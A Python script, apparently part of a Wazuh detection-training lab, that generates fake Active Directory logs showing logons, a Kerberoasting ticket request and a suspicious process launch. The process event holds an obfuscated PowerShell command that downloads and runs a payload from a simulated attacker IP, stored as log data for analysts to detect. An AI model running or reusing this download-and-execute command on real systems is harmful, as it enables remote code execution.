#!/usr/bin/env python3
"""
WazuhBOTS — Active Directory Log Simulator
Generates realistic Windows Security/Sysmon event logs in JSON format
for the Iron Gate scenario (Scenario 2).

These logs simulate what Wazuh would collect from a real AD environment.
"""

import json
import random
import time
from datetime import datetime, timedelta

OUTPUT_DIR = "/var/log/windows-events"

# Simulated AD environment
DOMAIN = "CORPNET.LOCAL"
DC_HOSTNAME = "DC01"
USERS = ["jdoe", "admin.jdoe", "svc_backup", "svc_sql", "administrator"]
WORKSTATIONS = ["WS-FINANCE01", "WS-HR02", "WS-DEV03", "WS-EXEC04"]
ATTACKER_IP = "172.25.0.100"
C2_DOMAIN = "update-service.evil.com"


def generate_logon_event(user, source_ip, success=True):
    """Generate Windows Event ID 4624/4625 (Logon Success/Failure)."""
    event_id = 4624 if success else 4625
    return {
        "win": {
            "system": {
                "eventID": str(event_id),
                "computer": f"{DC_HOSTNAME}.{DOMAIN}",
                "channel": "Security",
                "providerName": "Microsoft-Windows-Security-Auditing"
            },
            "eventdata": {
                "targetUserName": user,
                "targetDomainName": DOMAIN,
                "ipAddress": source_ip,
                "logonType": "10" if not success else "3",
                "workstationName": random.choice(WORKSTATIONS),
                "logonProcessName": "NtLmSsp",
                "authenticationPackageName": "NTLM"
            }
        },
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "agent": {"name": "dc-srv", "id": "002"},
        "rule": {
            "id": "60106" if success else "60122",
            "level": 3 if success else 5,
            "description": f"Windows: Logon {'Success' if success else 'Failure'}"
        }
    }


def generate_kerberoast_event(target_spn):
    """Generate Event ID 4769 with RC4 encryption (Kerberoasting indicator)."""
    return {
        "win": {
            "system": {
                "eventID": "4769",
                "computer": f"{DC_HOSTNAME}.{DOMAIN}",
                "channel": "Security"
            },
            "eventdata": {
                "targetUserName": target_spn.split("/")[0],
                "serviceName": target_spn,
                "ticketEncryptionType": "0x17",  # RC4 = Kerberoasting indicator
                "ipAddress": ATTACKER_IP,
                "status": "0x0",
                "ticketOptions": "0x40810000"
            }
        },
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "agent": {"name": "dc-srv", "id": "002"},
        "rule": {
            "id": "60152",
            "level": 10,
            "description": "Windows: Kerberos TGS ticket requested with RC4 encryption",
            "mitre": {"id": ["T1558.003"], "tactic": ["Credential Access"]}
        }
    }


def generate_process_creation(parent, child, cmdline, user="NT AUTHORITY\\SYSTEM"):
    """Generate Sysmon Event ID 1 (Process Creation)."""
    return {
        "data": {
            "win": {
                "eventdata": {
                    "parentImage": parent,
                    "image": child,
                    "commandLine": cmdline,
                    "user": user,
                    "parentCommandLine": f"{parent}",
                    "originalFileName": child.split("\\")[-1],
                    "hashes": f"SHA256:{random.randbytes(32).hex()}"
                },
                "system": {
                    "eventID": "1",
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "computer": random.choice(WORKSTATIONS)
                }
            }
        },
        "timestamp": datetime.utcnow().isoformat() + "Z",
        "agent": {"name": "dc-srv", "id": "002"},
        "rule": {
            "id": "92100",
            "level": 12,
            "description": "Sysmon: Suspicious process execution detected"
        }
    }


if __name__ == "__main__":
    print("[AD Simulator] Generating baseline events...")
    # This script is used during dataset generation phase
    events = []

    # Normal logons
    for _ in range(50):
        user = random.choice(USERS[:3])
        events.append(generate_logon_event(user, f"172.25.0.{random.randint(30,40)}"))

    # Attack sequence
    events.append(generate_process_creation(
        "C:\\Windows\\System32\\cmd.exe",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA3ADIALgAyADUALgAwAC4AMQAwADAALwBwAGEAeQBsAG8AYQBkACcAKQA=",
        "CORPNET\\jdoe"
    ))

    events.append(generate_kerberoast_event("MSSQLSvc/sql01.corpnet.local:1433"))

    output_file = f"{OUTPUT_DIR}/iron_gate_events.json"
    with open(output_file, "w") as f:
        json.dump(events, f, indent=2)
    print(f"[AD Simulator] Generated {len(events)} events -> {output_file}")
